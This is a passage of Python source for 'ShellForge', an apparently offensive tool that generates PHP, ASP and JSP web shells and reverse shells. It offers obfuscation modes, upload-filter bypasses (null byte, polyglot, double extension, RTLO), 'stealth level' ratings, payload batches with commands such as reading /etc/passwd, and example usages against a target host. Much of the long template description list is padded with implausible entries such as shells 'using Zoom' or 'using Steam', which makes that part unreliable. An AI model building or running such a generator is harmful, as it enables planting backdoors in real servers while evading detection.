                'sqlite': 'PHP shell using SQLite3',
                'pdo': 'PHP shell using PDO',
                'mysqli': 'PHP shell using MySQLi',
                'xml': 'PHP shell using XML functions',
                'json': 'PHP shell using JSON functions',
                'yaml': 'PHP shell using YAML functions',
                'ini': 'PHP shell using INI parsing',
                'csv': 'PHP shell using CSV functions',
                'xmlrpc': 'PHP shell using XML-RPC',
                'soap': 'PHP shell using SOAP',
                'zip': 'PHP shell using ZIP functions',
                'tar': 'PHP shell using TAR functions',
                'image': 'PHP shell using image functions',
                'pdf': 'PHP shell using PDF functions',
                'excel': 'PHP shell using Excel functions',
                'word': 'PHP shell using Word functions',
                'powerpoint': 'PHP shell using PowerPoint functions',
                'audio': 'PHP shell using audio functions',
                'video': 'PHP shell using video functions',
                'flash': 'PHP shell using Flash functions',
                'svg': 'PHP shell using SVG functions',
                'math': 'PHP shell using math functions',
                'crypto': 'PHP shell using crypto functions',
                'hash': 'PHP shell using hash functions',
                'random': 'PHP shell using random functions',
                'uuid': 'PHP shell using UUID functions',
                'time': 'PHP shell using time functions',
                'date': 'PHP shell using date functions',
                'timezone': 'PHP shell using timezone functions',
                'locale': 'PHP shell using locale functions',
                'currency': 'PHP shell using currency functions',
                'number': 'PHP shell using number formatting',
                'convert': 'PHP shell using character conversion',
                'translate': 'PHP shell using translation functions',
                'compress': 'PHP shell using compression',
                'decompress': 'PHP shell using decompression',
                'encode': 'PHP shell using base64 encoding',
                'decode': 'PHP shell using base64 decoding',
                'encrypt': 'PHP shell using encryption',
                'decrypt': 'PHP shell using decryption',
                'sign': 'PHP shell using digital signatures',
                'verify': 'PHP shell using signature verification',
                'seal': 'PHP shell using sealed encryption',
                'open': 'PHP shell using sealed decryption',
                'pkcs7': 'PHP shell using PKCS7',
                'x509': 'PHP shell using X.509 certificates',
                'csr': 'PHP shell using certificate requests',
                'pkey': 'PHP shell using public key crypto',
                'dh': 'PHP shell using Diffie-Hellman',
                'ecdh': 'PHP shell using ECDH',
                'random_pseudo': 'PHP shell using pseudo-random bytes',
                'cipher_iv': 'PHP shell using cipher IVs',
                'get_cipher': 'PHP shell listing cipher methods',
                'get_digest': 'PHP shell listing digest methods',
                'get_curves': 'PHP shell listing elliptic curves',
                'error': 'PHP shell showing crypto errors',
                'version': 'PHP shell showing OpenSSL version',
                'config': 'PHP shell showing cert locations'
            },
            'asp': {
                'basic': 'Basic ASP shell with eval()',
                'execute': 'ASP shell using execute()',
                'run': 'ASP shell using run()',
                'shell': 'ASP shell using shell()',
                'system': 'ASP shell using system()',
                'exec': 'ASP shell using exec()',
                'wscript': 'ASP shell using WScript.Shell',
                'cmd': 'ASP shell using cmd.exe',
                'process': 'ASP shell using process execution',
                'shell_object': 'ASP shell using Shell.Application',
                'fso': 'ASP shell using FileSystemObject',
                'textstream': 'ASP shell using TextStream',
                'file': 'ASP shell using file operations',
                'folder': 'ASP shell using folder operations',
                'drive': 'ASP shell using drive information',
                'registry': 'ASP shell using registry access',
                'environment': 'ASP shell using environment variables',
                'network': 'ASP shell using network information',
                'printer': 'ASP shell using printer information',
                'user': 'ASP shell using user information',
                'adsi': 'ASP shell using ADSI',
                'iis': 'ASP shell using IIS management',
                'ado': 'ASP shell using ADO',
                'recordset': 'ASP shell using Recordset',
                'command': 'ASP shell using Command object',
                'stream': 'ASP shell using Stream object',
                'xml': 'ASP shell using XML DOM',
                'xmlhttp': 'ASP shell using XMLHTTP',
                'cdo': 'ASP shell using CDO messaging',
                'outlook': 'ASP shell using Outlook',
                'excel': 'ASP shell using Excel',
                'word': 'ASP shell using Word',
                'powerpoint': 'ASP shell using PowerPoint',
                'access': 'ASP shell using Access',
                'visio': 'ASP shell using Visio',
                'project': 'ASP shell using MS Project',
                'publisher': 'ASP shell using Publisher',
                'frontpage': 'ASP shell using FrontPage',
                'infopath': 'ASP shell using InfoPath',
                'onenote': 'ASP shell using OneNote',
                'sharepoint': 'ASP shell using SharePoint',
                'skype': 'ASP shell using Skype',
                'teams': 'ASP shell using Teams',
                'zoom': 'ASP shell using Zoom',
                'webex': 'ASP shell using WebEx',
                'gotomeeting': 'ASP shell using GoToMeeting',
                'discord': 'ASP shell using Discord',
                'teamspeak': 'ASP shell using TeamSpeak',
                'ventrilo': 'ASP shell using Ventrilo',
                'mumble': 'ASP shell using Mumble',
                'raidcall': 'ASP shell using RaidCall',
                'curse': 'ASP shell using Curse',
                'origin': 'ASP shell using Origin',
                'steam': 'ASP shell using Steam',
                'epic': 'ASP shell using Epic Games',
                'uplay': 'ASP shell using Uplay',
                'battlenet': 'ASP shell using Battle.net',
                'gog': 'ASP shell using GOG',
                'humble': 'ASP shell using Humble Bundle',
                'itch': 'ASP shell using Itch.io',
                'gamejolt': 'ASP shell using Game Jolt',
                'kartridge': 'ASP shell using Kartridge'
            },
            'jsp': {
                'basic': 'Basic JSP shell using Runtime.exec()',
                'process': 'JSP shell using Process object',
                'runtime': 'JSP shell using Runtime object',
                'exec': 'JSP shell using exec() method',
                'shell': 'JSP shell using /bin/sh',
                'cmd': 'JSP shell using cmd.exe',
                'powershell': 'JSP shell using PowerShell',
                'bash': 'JSP shell using bash',
                'sh': 'JSP shell using sh',
                'zsh': 'JSP shell using zsh',
                'fish': 'JSP shell using fish',
                'csh': 'JSP shell using csh',
                'tcsh': 'JSP shell using tcsh',
                'ksh': 'JSP shell using ksh',
                'dash': 'JSP shell using dash',
                'busybox': 'JSP shell using busybox',
                'python': 'JSP shell using Python',
                'python3': 'JSP shell using Python3',
                'perl': 'JSP shell using Perl',
                'ruby': 'JSP shell using Ruby',
                'node': 'JSP shell using Node.js',
                'php': 'JSP shell using PHP',
                'lua': 'JSP shell using Lua',
                'awk': 'JSP shell using AWK',
                'sed': 'JSP shell using sed',
                'grep': 'JSP shell using grep',
                'find': 'JSP shell using find',
                'xargs': 'JSP shell using xargs',
                'wget': 'JSP shell using wget',
                'curl': 'JSP shell using curl',
                'nc': 'JSP shell using netcat',
                'netcat': 'JSP shell using netcat',
                'telnet': 'JSP shell using telnet',
                'ssh': 'JSP shell using SSH',
                'scp': 'JSP shell using SCP',
                'ftp': 'JSP shell using FTP',
                'sftp': 'JSP shell using SFTP',
                'mysql': 'JSP shell using MySQL',
                'psql': 'JSP shell using PostgreSQL',
                'sqlite': 'JSP shell using SQLite',
                'mongo': 'JSP shell using MongoDB',
                'redis': 'JSP shell using Redis',
                'ldap': 'JSP shell using LDAP',
                'smtp': 'JSP shell using SMTP',
                'mail': 'JSP shell using mail',
                'sendmail': 'JSP shell using sendmail',
                'postfix': 'JSP shell using Postfix',
                'exim': 'JSP shell using Exim',
                'dovecot': 'JSP shell using Dovecot',
                'apache': 'JSP shell using Apache',
                'nginx': 'JSP shell using Nginx',
                'lighttpd': 'JSP shell using Lighttpd',
                'tomcat': 'JSP shell using Tomcat',
                'jboss': 'JSP shell using JBoss',
                'websphere': 'JSP shell using WebSphere',
                'weblogic': 'JSP shell using WebLogic',
                'glassfish': 'JSP shell using GlassFish',
                'jetty': 'JSP shell using Jetty',
                'undertow': 'JSP shell using Undertow',
                'resin': 'JSP shell using Resin',
                'catalina': 'JSP shell using Catalina',
                'systemd': 'JSP shell using systemd',
                'service': 'JSP shell using service command',
                'init': 'JSP shell using init',
                'reboot': 'JSP shell using reboot',
                'halt': 'JSP shell using halt',
                'poweroff': 'JSP shell using poweroff',
                'shutdown': 'JSP shell using shutdown',
                'crontab': 'JSP shell using crontab',
                'at': 'JSP shell using at',
                'batch': 'JSP shell using batch',
                'cron': 'JSP shell using cron',
                'anacron': 'JSP shell using anacron',
                'logrotate': 'JSP shell using logrotate',
                'rsyslog': 'JSP shell using rsyslog',
                'syslog': 'JSP shell using syslog',
                'klog': 'JSP shell using klog',
                'dmesg': 'JSP shell using dmesg',
                'journalctl': 'JSP shell using journalctl',
                'auditctl': 'JSP shell using auditctl',
                'ausearch': 'JSP shell using ausearch',
                'aureport': 'JSP shell using aureport',
                'aulast': 'JSP shell using aulast',
                'aulastlog': 'JSP shell using aulastlog',
                'auvirt': 'JSP shell using auvirt',
                'iptables': 'JSP shell using iptables',
                'ip6tables': 'JSP shell using ip6tables',
                'firewall': 'JSP shell using firewall-cmd',
                'ufw': 'JSP shell using ufw',
                'fail2ban': 'JSP shell using fail2ban',
                'tcpdump': 'JSP shell using tcpdump',
                'wireshark': 'JSP shell using Wireshark',
                'tshark': 'JSP shell using tshark',
                'nmap': 'JSP shell using nmap',
                'masscan': 'JSP shell using masscan',
                'zmap': 'JSP shell using zmap',
                'unicornscan': 'JSP shell using unicornscan',
                'hping3': 'JSP shell using hping3',
                'nping': 'JSP shell using nping',
                'scapy': 'JSP shell using Scapy',
                'netstat': 'JSP shell using netstat',
                'ss': 'JSP shell using ss',
                'lsof': 'JSP shell using lsof',
                'fuser': 'JSP shell using fuser',
                'route': 'JSP shell using route',
                'ip': 'JSP shell using ip',
                'ifconfig': 'JSP shell using ifconfig',
                'iwconfig': 'JSP shell using iwconfig',
                'iwlist': 'JSP shell using iwlist',
                'airmon': 'JSP shell using airmon-ng',
                'airodump': 'JSP shell using airodump-ng',
                'aireplay': 'JSP shell using aireplay-ng',
                'aircrack': 'JSP shell using aircrack-ng',
                'reaver': 'JSP shell using reaver',
                'bully': 'JSP shell using bully',
                'pixiewps': 'JSP shell using pixiewps',
                'wifite': 'JSP shell using wifite',
                'fern': 'JSP shell using fern-wifi-cracker',
                'cowpatty': 'JSP shell using cowpatty',
                'genpmk': 'JSP shell using genpmk',
                'pyrit': 'JSP shell using pyrit',
                'hashcat': 'JSP shell using hashcat',
                'john': 'JSP shell using John the Ripper',
                'hydra': 'JSP shell using Hydra',
                'medusa': 'JSP shell using Medusa',
                'ncrack': 'JSP shell using ncrack',
                'patator': 'JSP shell using Patator',
                'brutespray': 'JSP shell using brutespray',
                'crowbar': 'JSP shell using crowbar',
                'gobuster': 'JSP shell using gobuster',
                'dirb': 'JSP shell using dirb',
                'wfuzz': 'JSP shell using wfuzz',
                'ffuf': 'JSP shell using ffuf',
                'feroxbuster': 'JSP shell using feroxbuster',
                'rustbuster': 'JSP shell using rustbuster',
                'cansina': 'JSP shell using cansina',
                'yawast': 'JSP shell using yawast',
                'nikto': 'JSP shell using Nikto',
                'skipfish': 'JSP shell using skipfish',
                'wapiti': 'JSP shell using wapiti',
                'arachni': 'JSP shell using Arachni',
                'vega': 'JSP shell using Vega',
                'burp': 'JSP shell using Burp Suite',
                'zap': 'JSP shell using OWASP ZAP',
                'sqlmap': 'JSP shell using sqlmap',
                'nosqlmap': 'JSP shell using nosqlmap',
                'commix': 'JSP shell using commix',
                'wpscan': 'JSP shell using wpscan',
                'joomscan': 'JSP shell using joomscan',
                'droopest': 'JSP shell using droopest',
                'cmsmap': 'JSP shell using cmsmap',
                'plecost': 'JSP shell using plecost',
                'wpseku': 'JSP shell using wpseku',
                'wpstress': 'JSP shell using wpstress',
                'dtd': 'JSP shell using DTD',
                'xxe': 'JSP shell using XXE',
                'xmlinject': 'JSP shell using XML injection',
                'xslt': 'JSP shell using XSLT',
                'xpath': 'JSP shell using XPath',
                'xquery': 'JSP shell using XQuery',
                'xinclude': 'JSP shell using XInclude',
                'xpointer': 'JSP shell using XPointer',
                'xlink': 'JSP shell using XLink',
                'xschema': 'JSP shell using XML Schema',
                'xforms': 'JSP shell using XForms',
                'xhtml': 'JSP shell using XHTML',
                'xss': 'JSP shell using XSS',
                'csrf': 'JSP shell using CSRF',
                'clickjacking': 'JSP shell using clickjacking',
                'session': 'JSP shell using session manipulation',
                'cookie': 'JSP shell using cookie manipulation',
                'jwt': 'JSP shell using JWT',
                'oauth': 'JSP shell using OAuth',
                'saml': 'JSP shell using SAML',
                'ldap': 'JSP shell using LDAP',
                'kerberos': 'JSP shell using Kerberos',
                'ntlm': 'JSP shell using NTLM',
                'digest': 'JSP shell using digest authentication',
                'basic': 'JSP shell using basic authentication',
                'bearer': 'JSP shell using bearer tokens',
                'api': 'JSP shell using API calls',
                'rest': 'JSP shell using REST APIs',
                'graphql': 'JSP shell using GraphQL',
                'soap': 'JSP shell using SOAP',
                'rpc': 'JSP shell using RPC',
                'grpc': 'JSP shell using gRPC',
                'thrift': 'JSP shell using Thrift',
                'avro': 'JSP shell using Avro',
                'protobuf': 'JSP shell using Protocol Buffers',
                'capnproto': 'JSP shell using Cap\'n Proto',
                'flatbuffers': 'JSP shell using FlatBuffers',
                'msgpack': 'JSP shell using MessagePack',
                'bson': 'JSP shell using BSON',
                'cbor': 'JSP shell using CBOR',
                'ubjson': 'JSP shell using UBJSON',
                'flexbuffers': 'JSP shell using FlexBuffers',
                'smile': 'JSP shell using Smile',
                'ion': 'JSP shell using Ion',
                'hadoop': 'JSP shell using Hadoop',
                'spark': 'JSP shell using Spark',
                'flink': 'JSP shell using Flink',
                'storm': 'JSP shell using Storm',
                'kafka': 'JSP shell using Kafka',
                'zookeeper': 'JSP shell using ZooKeeper',
                'cassandra': 'JSP shell using Cassandra',
                'mongodb': 'JSP shell using MongoDB',
                'couchdb': 'JSP shell using CouchDB',
                'neo4j': 'JSP shell using Neo4j',
                'elastic': 'JSP shell using Elasticsearch',
                'solr': 'JSP shell using Solr',
                'lucene': 'JSP shell using Lucene',
                'splunk': 'JSP shell using Splunk',
                'elk': 'JSP shell using ELK stack',
                'graylog': 'JSP shell using Graylog',
                'logstash': 'JSP shell using Logstash',
                'kibana': 'JSP shell using Kibana',
                'grafana': 'JSP shell using Grafana',
                'prometheus': 'JSP shell using Prometheus',
                'influxdb': 'JSP shell using InfluxDB',
                'telegraf': 'JSP shell using Telegraf',
                'chronograf': 'JSP shell using Chronograf',
                'kapacitor': 'JSP shell using Kapacitor',
                'opennms': 'JSP shell using OpenNMS',
                'nagios': 'JSP shell using Nagios',
                'icinga': 'JSP shell using Icinga',
                'zabbix': 'JSP shell using Zabbix',
                'cacti': 'JSP shell using Cacti',
                'mrtg': 'JSP shell using MRTG',
                'rrdtool': 'JSP shell using RRDtool',
                'smokeping': 'JSP shell using SmokePing',
                'observium': 'JSP shell using Observium',
                'librenms': 'JSP shell using LibreNMS',
                'collectd': 'JSP shell using collectd',
                'statsd': 'JSP shell using StatsD',
                'graphite': 'JSP shell using Graphite',
                'carbon': 'JSP shell using Carbon',
                'whisper': 'JSP shell using Whisper',
                'ceres': 'JSP shell using Ceres',
                'kairosdb': 'JSP shell using KairosDB',
                'blueflood': 'JSP shell using Blueflood',
                'atlas': 'JSP shell using Atlas',
                'villoc': 'JSP shell using Villoc',
                'pin': 'JSP shell using Intel Pin',
                'valgrind': 'JSP shell using Valgrind',
                'gdb': 'JSP shell using GDB',
                'lldb': 'JSP shell using LLDB',
                'radare2': 'JSP shell using Radare2',
                'ida': 'JSP shell using IDA Pro',
                'binaryninja': 'JSP shell using Binary Ninja',
                'hopper': 'JSP shell using Hopper',
                'ghidra': 'JSP shell using Ghidra',
                'cutter': 'JSP shell using Cutter',
                'x64dbg': 'JSP shell using x64dbg',
                'ollydbg': 'JSP shell using OllyDbg',
                'windbg': 'JSP shell using WinDbg',
                'immunity': 'JSP shell using Immunity Debugger',
                'pwndbg': 'JSP shell using Pwndbg',
                'peda': 'JSP shell using PEDA',
                'gef': 'JSP shell using GEF',
                'voltron': 'JSP shell using Voltron',
                'angr': 'JSP shell using Angr',
                'manticore': 'JSP shell using Manticore',
                'mayhem': 'JSP shell using Mayhem',
                's2e': 'JSP shell using S2E',
                'triton': 'JSP shell using Triton',
                'qiling': 'JSP shell using Qiling',
                'unicorn': 'JSP shell using Unicorn',
                'keystone': 'JSP shell using Keystone',
                'capstone': 'JSP shell using Capstone',
                'ropper': 'JSP shell using Ropper',
                'ropgadget': 'JSP shell using ROPgadget',
                'checksec': 'JSP shell using checksec',
                'pwnchk': 'JSP shell using pwnchk',
                'seccomp': 'JSP shell using seccomp',
                'strace': 'JSP shell using strace',
                'ltrace': 'JSP shell using ltrace',
                'dtrace': 'JSP shell using DTrace',
                'systemtap': 'JSP shell using SystemTap',
                'perf': 'JSP shell using perf',
                'oprofile': 'JSP shell using OProfile',
                'dstat': 'JSP shell using dstat',
                'htop': 'JSP shell using htop',
                'iotop': 'JSP shell using iotop',
                'atop': 'JSP shell using atop',
                'nmon': 'JSP shell using nmon',
                'collectl': 'JSP shell using collectl',
                'sar': 'JSP shell using sar',
                'vmstat': 'JSP shell using vmstat',
                'iostat': 'JSP shell using iostat',
                'mpstat': 'JSP shell using mpstat',
                'pidstat': 'JSP shell using pidstat',
                'free': 'JSP shell using free',
                'slabtop': 'JSP shell using slabtop',
                'numastat': 'JSP shell using numastat',
                'tuned': 'JSP shell using tuned',
                'powertop': 'JSP shell using powertop',
                'cpufreq': 'JSP shell using cpufreq',
                'cpuid': 'JSP shell using cpuid',
                'dmidecode': 'JSP shell using dmidecode',
                'lshw': 'JSP shell using lshw',
                'lsusb': 'JSP shell using lsusb',
                'lspci': 'JSP shell using lspci',
                'lsblk': 'JSP shell using lsblk',
                'blkid': 'JSP shell using blkid',
                'fdisk': 'JSP shell using fdisk',
                'parted': 'JSP shell using parted',
                'gparted': 'JSP shell using gparted',
                'testdisk': 'JSP shell using testdisk',
                'photorec': 'JSP shell using photorec',
                'scalpel': 'JSP shell using scalpel',
                'foremost': 'JSP shell using foremost',
                'magicrescue': 'JSP shell using magicrescue',
                'ddrescue': 'JSP shell using ddrescue',
                'safecopy': 'JSP shell using safecopy',
                'ddrescueview': 'JSP shell using ddrescueview',
                'gddrescue': 'JSP shell using gddrescue',
                'lde': 'JSP shell using lde',
                'rstudio': 'JSP shell using R-Studio',
                'autopsy': 'JSP shell using Autopsy',
                'sleuthkit': 'JSP shell using Sleuth Kit',
                'tsk': 'JSP shell using TSK',
                'yara': 'JSP shell using YARA',
                'yarac': 'JSP shell using YARA compiler',
                'clamav': 'JSP shell using ClamAV',
                'freshclam': 'JSP shell using freshclam',
                'clamscan': 'JSP shell using clamscan',
                'clamdscan': 'JSP shell using clamdscan',
                'sigtool': 'JSP shell using sigtool',
                'virsh': 'JSP shell using virsh',
                'virt': 'JSP shell using virt tools',
                'kvm': 'JSP shell using KVM',
                'qemu': 'JSP shell using QEMU',
                'virtualbox': 'JSP shell using VirtualBox',
                'vmware': 'JSP shell using VMware',
                'vbox': 'JSP shell using VBox tools',
                'docker': 'JSP shell using Docker',
                'podman': 'JSP shell using Podman',
                'lxc': 'JSP shell using LXC',
                'lxd': 'JSP shell using LXD',
                'rkt': 'JSP shell using rkt',
                'systemd-nspawn': 'JSP shell using systemd-nspawn',
                'chroot': 'JSP shell using chroot',
                'schroot': 'JSP shell using schroot',
                'firejail': 'JSP shell using Firejail',
                'bubblewrap': 'JSP shell using Bubblewrap',
                'flatpak': 'JSP shell using Flatpak',
                'snap': 'JSP shell using Snap',
                'appimage': 'JSP shell using AppImage'
            }
        }
        
        return descriptions.get(extension, {}).get(template_type, f"{extension} {template_type} shell")
    
    def _get_template_complexity(self, template: str) -> str:
        """Determine template complexity"""
        if len(template) < 50:
            return "Simple"
        elif len(template) < 150:
            return "Medium"
        elif len(template) < 300:
            return "Complex"
        else:
            return "Very Complex"
    
    def _get_stealth_level(self, template_type: str) -> str:
        """Determine stealth level based on template type"""
        stealth_keywords = ['stealth', 'bypass', 'hidden', 'obfuscated', 'encoded']
        evasion_keywords = ['concat', 'variable', 'array', 'object', 'reflection', 'callback']
        
        template_lower = template_type.lower()
        
        if any(keyword in template_lower for keyword in stealth_keywords):
            return "High"
        elif any(keyword in template_lower for keyword in evasion_keywords):
            return "Medium"
        elif template_type in ['basic', 'system', 'exec']:
            return "Low"
        else:
            return "Medium"
    
    def _get_example_usage(self, extension: str, template_type: str) -> str:
        """Get example usage for template"""
        if extension == 'php':
            if template_type == 'basic':
                return "http://target.com/shell.php?cmd=whoami"
            elif template_type == 'stealth':
                return "POST to shell.php with x=whoami"
            elif template_type == 'weevely':
                return "weevely generate && weevely connect"
        elif extension == 'asp':
            return "http://target.com/shell.asp?cmd=whoami"
        elif extension == 'jsp':
            return "http://target.com/shell.jsp?cmd=whoami"
        
        return f"http://target.com/shell.{extension}?cmd=whoami"
    
    def save_shell(self, shell, filename: str, extension: str, bypass: Optional[str] = None) -> str:
        """Save shell to file with optional bypass method"""
        
        # Handle tuple return from generate_shell with bypass
        if isinstance(shell, tuple):
            shell_content, bypass_method = shell
            bypass = bypass_method
        else:
            shell_content = shell
        
        # Apply bypass method if specified
        if bypass and bypass in self.bypass_methods:
            filename, shell_content = self.bypass_methods[bypass](filename, shell_content)
        
        if not filename.endswith(f'.{extension}') and '.' not in filename.split('/')[-1]:
            filename += f'.{extension}'
        
        # Handle binary content (for zip files)
        mode = 'wb' if isinstance(shell_content, bytes) else 'w'
        with open(filename, mode) as f:
            if isinstance(shell_content, bytes):
                f.write(shell_content)
            else:
                f.write(shell_content)
        
        return filename
    
    def generate_batch(self, configs: List[Dict]) -> List[str]:
        """Generate multiple shells based on configurations"""
        results = []
        for config in configs:
            try:
                shell = self.generate_shell(**config)
                results.append(shell)
            except Exception as e:
                results.append(f"Error: {str(e)}")
        
        return results
    
    def generate_wordlist(self, extension: str, template_type: str = 'basic') -> List[str]:
        """Generate wordlist of possible shell variations"""
        wordlist = []
        base_shell = self.templates[extension][template_type]
        
        # Common variations
        variations = [
            ('cmd', 'command', 'exec', 'system', 'shell', 'run', 'execute'),
            ('x', 'c', 'q', 's', 'p', 'a', 'b', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'r', 't', 'u', 'v', 'w', 'y', 'z'),
            ('password', 'pass', 'pwd', 'auth', 'key', 'token', 'secret'),
            ('file', 'filename', 'path', 'location', 'url', 'uri', 'address')
        ]
        
        # Generate variations by replacing parameter names
        for param_variations in variations:
            for var in param_variations[1:]:
                modified_shell = base_shell.replace(param_variations[0], var)
                if modified_shell != base_shell:
                    wordlist.append(modified_shell)
        
        return wordlist
    
    def generate_payloads(self, extension: str, template_type: str = 'basic', 
                         commands: List[str] = None) -> List[str]:
        """Generate payloads with different commands"""
        if commands is None:
            commands = ['whoami', 'id', 'uname -a', 'pwd', 'ls -la', 'cat /etc/passwd', 'netstat -an']
        
        payloads = []
        for cmd in commands:
            try:
                payload = self.generate_shell(extension, template_type, cmd)
                payloads.append(payload)
            except Exception as e:
                payloads.append(f"Error with command '{cmd}': {str(e)}")
        
        return payloads
    
    def analyze_shell(self, shell: str) -> Dict:
        """Analyze shell code for security assessment"""
        analysis = {
            'length': len(shell),
            'lines': shell.count('\n') + 1,
            'functions': [],
            'keywords': [],
            'risk_level': 'Unknown',
            'detectability': 'Unknown',
            'obfuscation_detected': False
        }
        
        # Detect functions
        function_patterns = [
            r'system\s*\(', r'exec\s*\(', r'shell_exec\s*\(', r'passthru\s*\(',
            r'popen\s*\(', r'proc_open\s*\(', r'eval\s*\(', r'assert\s*\(',
            r'preg_replace\s*\(', r'create_function\s*\(', r'include\s*\(',
            r'require\s*\(', r'file_get_contents\s*\(', r'curl_exec\s*\('
        ]
        
        import re
        for pattern in function_patterns:
            matches = re.findall(pattern, shell, re.IGNORECASE)
            if matches:
                analysis['functions'].extend(matches)
        
        # Detect keywords
        keywords = ['cmd', 'command', 'shell', 'execute', 'eval', 'system', 'backdoor']
        for keyword in keywords:
            if keyword.lower() in shell.lower():
                analysis['keywords'].append(keyword)
        
        # Determine risk level
        if len(analysis['functions']) > 3:
            analysis['risk_level'] = 'High'
        elif len(analysis['functions']) > 1:
            analysis['risk_level'] = 'Medium'
        else:
            analysis['risk_level'] = 'Low'
        
        # Determine detectability
        if len(shell) > 500 or 'base64' in shell.lower() or len(re.findall(r'[A-Za-z0-9+/]{20,}', shell)) > 0:
            analysis['obfuscation_detected'] = True
            analysis['detectability'] = 'Low'
        elif len(analysis['functions']) <= 1:
            analysis['detectability'] = 'High'
        else:
            analysis['detectability'] = 'Medium'
        
        return analysis


def main():
    """Main CLI interface"""
    parser = argparse.ArgumentParser(
        description='ShellForge - Advanced Shell Generation Framework',
        usage='%(prog)s [IP PORT EXTENSION] OR [OPTIONS]',
        epilog='Examples:\n'
               '  %(prog)s 192.168.1.100 4444 php\n'
               '  %(prog)s 10.0.0.1 9999 jsp\n'
               '  %(prog)s --extension php --template stealth\n',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Positional arguments (optional)
    parser.add_argument('ip', nargs='?', help='IP address for reverse shell')
    parser.add_argument('port', nargs='?', help='Port for reverse shell')
    parser.add_argument('extension_pos', nargs='?', metavar='EXTENSION', help='File extension (php, jsp, py, etc)')
    
    # Named arguments
    parser.add_argument('--extension', '-e', help='File extension (php, asp, jsp)')
    parser.add_argument('--template', '-t', default='basic', help='Template type')
    parser.add_argument('--command', '-c', help='Command to execute')
    parser.add_argument('--obfuscate', '-o', choices=['base64', 'hex', 'reverse', 'xor', 'rot13', 'mixed', 
                                                       'aes', 'gzip', 'double_encode', 'unicode_escape',
                                                       'char_encode', 'variable_chain', 'zero_width', 'polymorphic'], 
                        help='Obfuscation method (2025 advanced methods included)')
    parser.add_argument('--encode', choices=['url', 'html', 'unicode', 'binary'], help='Encoding method')
    parser.add_argument('--bypass', '-b', choices=['double_extension', 'null_byte', 'case_manipulation',
                                                     'special_chars', 'content_type', 'polyglot', 
                                                     'zip_in_zip', 'nested_archive', 'magic_bytes',
                                                     'rtlo', 'unicode_homoglyph'],
                        help='Bypass method for upload filters')
    parser.add_argument('--output', '-f', help='Output file name')
    parser.add_argument('--list-extensions', action='store_true', help='List supported extensions')
    parser.add_argument('--list-templates', action='store_true', help='List available templates for extension')
    parser.add_argument('--list-obfuscation', action='store_true', help='List all obfuscation methods')
    parser.add_argument('--list-bypasses', action='store_true', help='List all bypass methods')
    parser.add_argument('--info', action='store_true', help='Show template information')
    parser.add_argument('--analyze', help='Analyze shell code from file')
    parser.add_argument('--wordlist', action='store_true', help='Generate wordlist of variations')
    parser.add_argument('--payloads', action='store_true', help='Generate multiple payloads')
    parser.add_argument('--batch', help='Generate batch shells from JSON config file')
    
    args = parser.parse_args()
    
    forge = ShellForge()
    
    # List obfuscation methods
    if args.list_obfuscation:
        print("Available Obfuscation Methods:")
        print("\n🔹 Basic Methods:")
        print("  - base64         : Base64 encoding")
        print("  - hex            : Hexadecimal encoding")
        print("  - reverse        : String reversal")
        print("  - xor            : XOR encryption")
        print("  - rot13          : ROT13 cipher")
        print("  - mixed          : Combination of methods")
        print("\n🔹 2025 Advanced Methods:")
        print("  - aes            : AES-style encryption (XOR + Base64)")
        print("  - gzip           : GZIP compression simulation")
        print("  - double_encode  : Double Base64 encoding")
        print("  - unicode_escape : Unicode escape sequences")
        print("  - char_encode    : Character code encoding")
        print("  - variable_chain : Variable chain obfuscation")
        print("  - zero_width     : Zero-width character injection")
        print("  - polymorphic    : Random polymorphic obfuscation")
        return
    
    # List bypass methods
    if args.list_bypasses:
        print("Available Bypass Methods:")
        print("\n🔸 File Extension Bypasses:")
        print("  - double_extension   : shell.php.png")
        print("  - null_byte          : shell.php%00.png")
        print("  - case_manipulation  : ShElL.PhP")
        print("  - special_chars      : shell.ph%20p")
        print("\n🔸 Content-Based Bypasses:")
        print("  - content_type       : Add magic bytes header")
        print("  - polyglot           : Valid image + PHP")
        print("  - magic_bytes        : Proper file signatures")
        print("\n🔸 Archive Bypasses:")
        print("  - zip_in_zip         : Nested ZIP files")
        print("  - nested_archive     : 3-level deep nesting")
        print("\n🔸 Unicode Bypasses:")
        print("  - rtlo               : Right-to-Left Override")
        print("  - unicode_homoglyph  : Similar looking chars")
        return
    
    # Handle positional arguments (IP PORT EXTENSION format)
    if args.ip and args.port and args.extension_pos:
        args.extension = args.extension_pos
        # Use reverse shell template for positional args
        if not args.template or args.template == 'basic':
            args.template = 'reverse'
        # Store IP and port for template substitution
        if not args.command:
            args.command = f"{{host}}={args.ip},{{port}}={args.port}"
        if not args.output:
            args.output = f"shell_{args.ip.replace('.','_')}_{args.port}.{args.extension_pos}"
    
    forge = ShellForge()
    
    if args.list_extensions:
        extensions = forge.list_extensions()
        print("Supported extensions:")
        for ext in extensions:
            print(f"  - {ext}")
        return
    
    if args.list_templates:
        if not args.extension and not args.extension_pos:
            print("Error: --extension required with --list-templates")
            return
        ext = args.extension or args.extension_pos
        templates = forge.list_templates(ext)
        print(f"Available templates for {ext}:")
        for template in templates:
            print(f"  - {template}")
        return
    
    if args.info:
        if not args.extension and not args.extension_pos:
            print("Error: --extension required with --info")
            return
        ext = args.extension or args.extension_pos
        if not args.template:
            print("Error: --template required with --info")
            return
        info = forge.get_template_info(ext, args.template)
        print(f"Template Information for {ext}::{args.template}:")
        print(f"  Description: {info['description']}")
        print(f"  Complexity: {info['complexity']}")
        print(f"  Stealth Level: {info['stealth_level']}")
        print(f"  Example Usage: {info['example_usage']}")
        return
    
    if args.analyze:
        try:
            with open(args.analyze, 'r') as f:
                shell_code = f.read()
            analysis = forge.analyze_shell(shell_code)
            print(f"Shell Analysis for {args.analyze}:")
            print(f"  Length: {analysis['length']} characters")
            print(f"  Lines: {analysis['lines']}")
            print(f"  Functions: {', '.join(analysis['functions']) if analysis['functions'] else 'None'}")
            print(f"  Keywords: {', '.join(analysis['keywords']) if analysis['keywords'] else 'None'}")
            print(f"  Risk Level: {analysis['risk_level']}")
            print(f"  Detectability: {analysis['detectability']}")
            print(f"  Obfuscation Detected: {analysis['obfuscation_detected']}")
        except Exception as e:
            print(f"Error analyzing file: {e}")
        return
    
    if args.wordlist:
        if not args.extension and not args.extension_pos:
            print("Error: --extension required with --wordlist")
            return
        ext = args.extension or args.extension_pos
        wordlist = forge.generate_wordlist(ext, args.template)
        print(f"Generated {len(wordlist)} shell variations:")
        for i, variation in enumerate(wordlist[:10]):  # Show first 10
